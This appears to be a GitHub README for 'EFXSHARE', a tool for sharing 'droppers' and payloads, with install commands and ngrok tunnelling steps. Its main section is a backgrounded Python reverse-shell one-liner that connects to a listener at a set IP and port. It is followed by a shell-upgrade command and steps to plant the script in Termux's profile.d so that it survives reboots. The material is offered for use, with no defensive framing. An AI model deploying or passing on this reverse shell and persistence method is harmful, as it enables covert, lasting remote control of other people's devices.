# EFXSHARE
Sharing quick droppers, payloads and file transfer at high speed
<h1>EFX SHARE SETUP</h1>

<b>Setup in Termux</b>
<pre> wget https://github.com/efxtv/efxshare/raw/main/termux/efxshare;mv efxshare /data/data/com.termux/files/usr/bin/;chmod +x /data/data/com.termux/files/usr/bin/efxshare </pre>
<br />
<b>Stup in Ubuntu/Kali/Debian</b>
<pre> wget https://github.com/efxtv/efxshare/raw/main/others/efxshare;sudo mv efxshare /usr/bin/;sudo chmod +x /usr/bin/efxshare </pre>
<br />
<b>Setup NGROK</b>
Go to https://ngrok.com/
<br />
Login with real email id, do not use temp email. It can reduce the speed and connectivity strength.
<br />
Verify your email addres by logging in to the email.
<br />
Download the file, by clicking on it (do not wget specially for termux). Once you visit the site you have to click on the button as shown below.<br />
<a href="https://youtu.be/zTsnjaCxcMo"><img src="https://raw.githubusercontent.com/efxtv/efxshare/main/ngrok-demo.jpg" alt="EFX TV"></a><br />
<br />
<b>Unzip the downloaded file</b>
<pre>unzip filename.zip</pre>
<br /><br />
Verify the auth tocken. For that you need to wath the video will be shared soon.
<br />
<h2>Bash Dropper file which runs in background</h2>
Copy the text below and save it as run.sh or some other name. Change the ip port as shown in video.
<pre>
export RHOST="192.168.1.37";export RPORT=4444;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")' &
</pre>
<br />
Start the listener in your host machine and execute the file run.sh to the terminal. It will start tunning in background. Even if you close the terminal it will keep running. This bash session will be more beautiful if you pace the command in the terminal after getting reverse connection.
<pre>
python -c 'import pty;pty.spawn("/bin/bash")'
</pre>
Want access with boot?
<br /> Drop the file run.sh in the locations:

<br /> For termux
<pre> /data/data/com.termux/files/usr/etc/profile.d </pre>
For Ubuntu and others ****
<pre></pre>

